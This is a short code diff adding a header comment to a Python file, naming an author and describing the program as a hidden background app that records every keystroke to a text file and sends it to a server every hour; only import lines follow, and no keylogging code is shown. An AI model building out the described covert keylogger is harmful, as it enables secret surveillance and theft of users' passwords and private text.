@@ -1,3 +1,6 @@
+#Author: Omri Yaakov
+#Purpose: App that is hidden in the background and capture every key stroke from the user to a txt file, And every hour send it to the server.
+
 import os
 import sys
 import logging
